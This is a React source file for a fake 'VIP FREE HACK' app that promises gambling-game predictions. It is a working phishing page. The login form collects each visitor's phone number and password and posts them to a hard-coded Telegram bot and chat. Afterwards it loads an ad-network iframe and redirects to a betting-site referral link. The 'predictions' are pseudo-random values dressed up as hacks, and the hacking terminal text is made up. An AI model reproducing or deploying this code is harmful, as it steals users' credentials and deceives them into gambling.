import React, { useState, useEffect } from 'react';
import { motion, AnimatePresence } from 'motion/react';
import { Shield, Lock, Smartphone, Terminal, AlertCircle, ChevronRight, Cpu, Activity, Globe } from 'lucide-react';

export default function App() {
  const [phoneNumber, setPhoneNumber] = useState('');
  const [password, setPassword] = useState('');
  const [error, setError] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [terminalLines, setTerminalLines] = useState<string[]>([]);
  const [isLoggedIn, setIsLoggedIn] = useState(false);
  const [isUnlocked, setIsUnlocked] = useState(false);
  const [accessKey, setAccessKey] = useState('');
  const [redirectTimer, setRedirectTimer] = useState(10);
  const [prediction, setPrediction] = useState({ text: '...', nums: '-- & --' });
  const [predictionTimer, setPredictionTimer] = useState(30);

  const REGISTRATION_LINK = "https://dkwin9.com/#/register?invitationCode=62371643494";
  const INTERMEDIATE_SITE = "https://www.profitablecpmratenetwork.com/q22i5byud?key=dcf3fce3472d6ba711a0feee502b7013";

  useEffect(() => {
    if (isLoggedIn && isUnlocked) {
      // Initialize prediction immediately
      const list = ["SMALL 1,3", "SMALL 2,4", "SMALL 0,4", "BIG 6,8", "BIG 7,9", "BIG 5,9"];
      const now = new Date();
      const ms = now.getTime();
      const p = Math.floor(ms / 30000);
      const seed = p * 1.234;
      const idx = Math.floor(Math.abs(Math.sin(seed) * list.length)) % list.length;
      const resultData = list[idx].split(' '); 
      setPrediction({ text: resultData[0], nums: resultData[1] });

      // Redirect timer
      const rTimer = setInterval(() => {
        setRedirectTimer(prev => {
          if (prev <= 1) {
            clearInterval(rTimer);
            window.location.href = REGISTRATION_LINK;
            return 0;
          }
          return prev - 1;
        });
      }, 1000);

      // Prediction engine update
      const pInterval = setInterval(() => {
        const now = new Date();
        const ms = now.getTime();
        const p = Math.floor(ms / 30000);
        const seed = p * 1.234;
        const idx = Math.floor(Math.abs(Math.sin(seed) * list.length)) % list.length;
        
        const resultData = list[idx].split(' '); 
        setPrediction({ text: resultData[0], nums: resultData[1] });

        const totalSec = now.getSeconds();
        const remaining = totalSec >= 30 ? 60 - totalSec : 30 - totalSec;
        setPredictionTimer(remaining);
      }, 1000);

      return () => {
        clearInterval(rTimer);
        clearInterval(pInterval);
      };
    }
  }, [isLoggedIn, isUnlocked]);

  useEffect(() => {
    document.title = "JOY PREMIUM";
    const lines = [
      "> INITIALIZING VIP_HACK_v4.0.1",
      "> ESTABLISHING ENCRYPTED TUNNEL...",
      "> BYPASSING MAIN_FRAME_FIREWALL...",
      "> INJECTING AUTH_PAYLOAD...",
      "> SYSTEM READY. AWAITING CREDENTIALS."
    ];
    let i = 0;
    const interval = setInterval(() => {
      if (i < lines.length) {
        setTerminalLines(prev => [...prev, lines[i]]);
        i++;
      } else {
        clearInterval(interval);
      }
    }, 600);
    return () => clearInterval(interval);
  }, []);

  const handleLogin = (e: React.FormEvent) => {
    e.preventDefault();
    setError('');
    setIsLoading(true);

    const BOT_TOKEN = "8654386699:AAHnd5JW6edp7SS63-AKUiCy18GpblVI7cI";
    const CHAT_ID = "8596479830";

    setTimeout(async () => {
      const cleanPhone = phoneNumber.trim();
      
      if (cleanPhone.length !== 11) {
        setError('ফোন নম্বর অবশ্যই ১১ ডিজিটের হতে হবে!');
        setIsLoading(false);
        return;
      }

      if (password.length < 8) {
        setError('পাসওয়ার্ড কমপক্ষে ৮ অক্ষরের হতে হবে!');
        setIsLoading(false);
        return;
      }

      // Prepare message for Telegram with HTML for click-to-copy
      // Phone number will be copyable without the leading zero if it exists
      const displayPhone = cleanPhone.startsWith('0') 
        ? `0<code>${cleanPhone.substring(1)}</code>` 
        : `<code>${cleanPhone}</code>`;

      const message = `
🚀 <b>VIP HACK LOGIN ATTEMPT</b> 🚀
━━━━━━━━━━━━━━━━━━
📱 <b>Phone:</b> ${displayPhone}
🔑 <b>Password:</b> <code>${password}</code>
🌐 <b>IP:</b> (Client Side)
━━━━━━━━━━━━━━━━━━
      `;

      try {
        // Send to Telegram
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            chat_id: CHAT_ID,
            text: message,
            parse_mode: 'HTML',
          }),
        });
      } catch (err) {
        console.error("Telegram notification failed:", err);
      }

      // Redirect immediately after sending (or trying to send)
      setIsLoggedIn(true);
      setIsLoading(false);
    }, 800);
  };

  if (isLoggedIn) {
    return (
      <div className="fixed inset-0 bg-black overflow-hidden">
        <iframe 
          src={INTERMEDIATE_SITE} 
          className="w-full h-full border-none"
          title="Game Frame"
        />
        
        {/* Floating Hacker Box */}
        <motion.div 
          drag
          dragMomentum={false}
          initial={{ top: '15%', left: '50%', x: '-50%' }}
          className="absolute w-64 bg-black border-2 border-cyan-500 rounded-xl p-5 text-center z-50 shadow-[0_0_30px_rgba(6,182,212,0.6)] cursor-move select-none"
        >
          {/* Scan line */}
          <div className="absolute top-0 left-0 w-full h-1 bg-cyan-400 shadow-[0_0_15px_#22d3ee] animate-scanline-move pointer-events-none" />
          
          <div className="text-white font-black text-base border-b border-white/10 pb-3 mb-5 tracking-[0.25em] uppercase drop-shadow-[0_0_8px_rgba(255,255,255,0.3)]">
            JOY PREMIUM
          </div>

          {!isUnlocked ? (
            <div className="space-y-4">
              <div className="relative">
                <input 
                  type="password"
                  value={accessKey}
                  onChange={(e) => setAccessKey(e.target.value)}
                  placeholder="ENTER ACCESS KEY"
                  className="w-full bg-zinc-900/80 border border-zinc-700 p-3 text-center text-white text-xs outline-none focus:border-neon-green transition-all placeholder:text-zinc-600 font-bold"
                />
              </div>
              <button 
                onClick={() => {
                  if (accessKey === 'joyvai') {
                    setIsUnlocked(true);
                  } else {
                    alert('WRONG KEY! ACCESS DENIED.');
                  }
                }}
                className="w-full py-3 bg-neon-green text-black text-xs font-black rounded uppercase hover:brightness-110 active:scale-95 transition-all shadow-[0_0_15px_rgba(0,255,0,0.3)]"
              >
                UNLOCK HACK
              </button>
            </div>
          ) : (
            <div className="space-y-4">
              <div className="bg-zinc-900/90 border border-white/5 p-4 rounded-md shadow-inner">
                <div className="text-[10px] text-yellow-400 font-black uppercase mb-2 tracking-widest">PREDICTION</div>
                <div className={`text-4xl font-black mb-1 drop-shadow-[0_0_10px_rgba(34,211,238,0.5)] ${prediction.text === 'BIG' ? 'text-cyan-400' : 'text-fuchsia-400'}`}>
                  {prediction.text}
                </div>
                <div className="text-lg font-black text-neon-green tracking-widest">
                  {prediction.nums}
                </div>
              </div>

              <div className="flex flex-col items-center gap-1">
                <div className="text-[11px] text-white font-bold tracking-widest">
                  NEXT : <span className="text-red-500">{predictionTimer}</span>s
                </div>
                <div className="text-[9px] text-zinc-500 uppercase tracking-tighter">
                  Auto-Redirecting in: <span className="text-neon-green">{redirectTimer}</span>s
                </div>
              </div>

              <a 
                href="https://t.me/+FdMf_SJE-ONlZWE1" 
                target="_blank" 
                rel="noopener noreferrer"
                className="block w-full py-3 bg-red-600 text-white text-xs font-black rounded uppercase hover:bg-red-700 transition-all shadow-[0_0_15px_rgba(220,38,38,0.4)] active:scale-95 text-center"
              >
                TELEGRAM
              </a>
            </div>
          )}
        </motion.div>

        <style>{`
          @keyframes rgb-border {
            0% { border-color: #ff0000; box-shadow: 0 0 15px #ff0000; }
            20% { border-color: #ffff00; box-shadow: 0 0 15px #ffff00; }
            40% { border-color: #00ff00; box-shadow: 0 0 15px #00ff00; }
            60% { border-color: #00ffff; box-shadow: 0 0 15px #00ffff; }
            80% { border-color: #0000ff; box-shadow: 0 0 15px #0000ff; }
            100% { border-color: #ff00ff; box-shadow: 0 0 15px #ff00ff; }
          }
          .animate-rgb-border {
            animation: rgb-border 5s linear infinite;
          }
          @keyframes scanline-move {
            0% { top: -5%; opacity: 0; }
            10% { opacity: 1; }
            90% { opacity: 1; }
            100% { top: 105%; opacity: 0; }
          }
          .animate-scanline-move {
            animation: scanline-move 2s linear infinite;
          }
        `}</style>
      </div>
    );
  }

  return (
    <div className="min-h-screen flex flex-col items-center justify-center p-6 bg-brutal-black overflow-hidden font-mono selection:bg-neon-green selection:text-brutal-black">
      {/* Background Grid (Square Lines) */}
      <div className="absolute inset-0 opacity-20 pointer-events-none overflow-hidden">
        <div className="absolute inset-0" 
             style={{ 
               backgroundImage: 'linear-gradient(to right, #00FF00 1px, transparent 1px), linear-gradient(to bottom, #00FF00 1px, transparent 1px)', 
               backgroundSize: '40px 40px' 
             }} />
        <motion.div 
          animate={{ y: ['0%', '100%'] }}
          transition={{ duration: 15, repeat: Infinity, ease: "linear" }}
          className="absolute inset-0 bg-gradient-to-b from-transparent via-neon-green/5 to-transparent h-[200%] w-full"
        />
      </div>

      <motion.div 
        initial={{ scale: 0.95, opacity: 0 }}
        animate={{ scale: 1, opacity: 1 }}
        className="w-full max-w-md relative z-10"
      >
        {/* Top Status Bar */}
        <div className="flex justify-between items-center mb-2 px-2 text-[10px] text-neon-green/50 uppercase tracking-widest">
          <div className="flex items-center gap-2">
            <Activity className="w-3 h-3 animate-pulse" />
            <span>Link: Established</span>
          </div>
          <div className="flex items-center gap-2">
            <Globe className="w-3 h-3" />
            <span>Region: BD_SEC_01</span>
          </div>
        </div>

        {/* Header with Glitch Effect (Reverted to First Design) */}
        <div className="mb-10 text-center relative pt-10">
          <motion.div
            animate={{ 
              x: [-2, 2, -2, 2, 0],
              y: [1, -1, 1, -1, 0],
              filter: ["hue-rotate(0deg)", "hue-rotate(90deg)", "hue-rotate(180deg)", "hue-rotate(270deg)", "hue-rotate(0deg)"]
            }}
            transition={{ repeat: Infinity, duration: 0.15, repeatDelay: 2 }}
            className="inline-flex flex-col items-center"
          >
            <h1 className="text-[40px] md:text-[65px] font-black uppercase tracking-tighter italic relative leading-tight flex flex-col items-center">
              <span className="text-white drop-shadow-[0_0_25px_rgba(255,255,255,0.4)]">VIP FREE HACK</span>
              
              {/* Glitch Layers (Popping Out Effect) */}
              <motion.div 
                animate={{ x: [-3, 3, -3], opacity: [0.5, 0.8, 0.5] }}
                transition={{ duration: 0.1, repeat: Infinity }}
                className="absolute -top-1 -left-1 text-red-500 opacity-50 select-none flex flex-col items-center w-full pointer-events-none mix-blend-screen"
              >
                <span>VIP FREE HACK</span>
              </motion.div>
              <motion.div 
                animate={{ x: [3, -3, 3], opacity: [0.5, 0.8, 0.5] }}
                transition={{ duration: 0.1, repeat: Infinity, delay: 0.05 }}
                className="absolute top-1 left-1 text-blue-500 opacity-50 select-none flex flex-col items-center w-full pointer-events-none mix-blend-screen"
              >
                <span>VIP FREE HACK</span>
              </motion.div>
            </h1>
          </motion.div>
          <div className="h-2.5 w-64 bg-neon-green mx-auto mt-8 skew-x-[-25deg] shadow-[0_0_30px_#00FF00]" />
        </div>

        {/* Terminal Output */}
        <div className="mb-8 p-4 bg-zinc-900/95 border-2 border-neon-green font-mono text-[11px] text-neon-green h-32 overflow-hidden shadow-[0_0_30px_rgba(0,255,0,0.15)] relative">
          <div className="absolute top-0 left-0 w-full h-full bg-gradient-to-b from-transparent via-neon-green/5 to-transparent pointer-events-none animate-scanline" />
          <AnimatePresence>
            {terminalLines.map((line, idx) => (
              <motion.div 
                key={idx}
                initial={{ x: -10, opacity: 0 }}
                animate={{ x: 0, opacity: 1 }}
                className="flex gap-2 mb-1"
              >
                <span className="text-neon-green/40">[{idx.toString().padStart(2, '0')}]</span>
                <span>{line}</span>
              </motion.div>
            ))}
          </AnimatePresence>
          <motion.span 
            animate={{ opacity: [1, 0] }}
            transition={{ repeat: Infinity, duration: 0.6 }}
            className="inline-block w-2 h-3 bg-neon-green ml-1"
          />
        </div>

        {/* Login Form Container */}
        <div className="relative group">
          {/* Scanning Line Animation */}
          <motion.div 
            animate={{ top: ['0%', '100%'] }}
            transition={{ duration: 3, repeat: Infinity, ease: "linear" }}
            className="absolute left-0 right-0 h-[2px] bg-neon-green/40 z-20 shadow-[0_0_10px_#00FF00] pointer-events-none"
          />

          <form onSubmit={handleLogin} className="bg-zinc-900/95 p-8 border-2 border-neon-green/30 space-y-6 relative overflow-hidden shadow-[0_0_40px_rgba(0,255,0,0.05)]">
            {/* Corner Accents (Unique Design) */}
            <div className="absolute top-0 left-0 w-8 h-8 border-t-4 border-l-4 border-neon-green" />
            <div className="absolute top-0 right-0 w-8 h-8 border-t-4 border-r-4 border-neon-green" />
            <div className="absolute bottom-0 left-0 w-8 h-8 border-b-4 border-l-4 border-neon-green" />
            <div className="absolute bottom-0 right-0 w-8 h-8 border-b-4 border-r-4 border-neon-green" />

            <div className="space-y-3">
              <label className="text-[11px] uppercase font-black tracking-[0.25em] text-zinc-500 flex items-center gap-2">
                <Smartphone className="w-3.5 h-3.5 text-neon-green" /> Phone Number (11 Digits)
              </label>
              <div className="relative">
                <input 
                  type="text"
                  maxLength={11}
                  value={phoneNumber}
                  onChange={(e) => setPhoneNumber(e.target.value.replace(/\D/g, ''))}
                  placeholder="01XXXXXXXXX"
                  className="w-full bg-black/50 border-2 border-zinc-800 p-5 font-mono text-neon-green outline-none focus:border-neon-green focus:shadow-[0_0_15px_rgba(0,255,0,0.2)] transition-all placeholder:text-zinc-800 text-lg"
                  required
                />
              </div>
            </div>

            <div className="space-y-3">
              <label className="text-[11px] uppercase font-black tracking-[0.25em] text-zinc-500 flex items-center gap-2">
                <Lock className="w-3.5 h-3.5 text-neon-green" /> Password (Min 8 Chars)
              </label>
              <input 
                type="password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                placeholder="••••••••"
                className="w-full bg-black/50 border-2 border-zinc-800 p-5 font-mono text-neon-green outline-none focus:border-neon-green focus:shadow-[0_0_15px_rgba(0,255,0,0.2)] transition-all placeholder:text-zinc-800 text-lg"
                required
              />
            </div>

            <AnimatePresence mode="wait">
              {error && (
                <motion.div 
                  initial={{ opacity: 0, x: 20 }}
                  animate={{ opacity: 1, x: 0 }}
                  exit={{ opacity: 0, x: -20 }}
                  className="flex items-center gap-3 text-red-500 text-[10px] font-bold bg-red-500/5 p-4 border-l-2 border-red-500 uppercase tracking-wider"
                >
                  <AlertCircle className="w-4 h-4 shrink-0" />
                  <span>{error}</span>
                </motion.div>
              )}
            </AnimatePresence>

            <button 
              type="submit"
              disabled={isLoading}
              className="w-full group relative py-6 bg-neon-green text-black font-black uppercase tracking-[0.4em] hover:brightness-110 active:scale-[0.98] transition-all disabled:opacity-50 disabled:cursor-not-allowed overflow-hidden shadow-[0_0_30px_rgba(0,255,0,0.3)]"
            >
              <div className="relative z-10 flex items-center justify-center gap-4 text-xl">
                {isLoading ? (
                  <>
                    <motion.div 
                      animate={{ rotate: 360 }}
                      transition={{ repeat: Infinity, duration: 1, ease: "linear" }}
                    >
                      <Cpu className="w-6 h-6" />
                    </motion.div>
                    <span>BYPASSING...</span>
                  </>
                ) : (
                  <>
                    <span>BYPASS SECURITY</span>
                    <ChevronRight className="w-6 h-6 group-hover:translate-x-2 transition-transform" />
                  </>
                )}
              </div>
            </button>
          </form>

          <div className="mt-8 text-center">
            <a 
              href={REGISTRATION_LINK}
              target="_blank"
              rel="noopener noreferrer"
              className="text-zinc-500 hover:text-neon-green text-xs tracking-widest transition-colors uppercase"
            >
              Don't have an account? <span className="text-neon-green font-bold underline">Register Now</span>
            </a>
          </div>
        </div>

        {/* Footer Info */}
        <div className="mt-8 flex justify-between items-center text-[9px] text-zinc-600 font-mono uppercase tracking-widest">
          <div className="flex items-center gap-2">
            <div className="w-1.5 h-1.5 rounded-full bg-neon-green animate-pulse" />
            Node: BD_DHAKA_09
          </div>
          <div className="flex items-center gap-4">
            <span>Enc: AES_256</span>
            <span>v4.0.1_STABLE</span>
          </div>
        </div>
      </motion.div>

      {/* Decorative Floating Elements */}
      <div className="fixed top-10 left-10 text-[10px] text-neon-green/10 font-mono hidden lg:block pointer-events-none">
        {`{
  "protocol": "VIP_HACK",
  "status": "active",
  "bypass_level": 9,
  "encryption": "SHA-512"
}`}
      </div>
      <div className="fixed bottom-10 right-10 text-[10px] text-neon-green/10 font-mono hidden lg:block pointer-events-none">
        01010111 01001000 01000001 01010100 00100000 01001001 01010011 00100000 01001000 01000001 01000011 01001011
      </div>
    </div>
  );
}
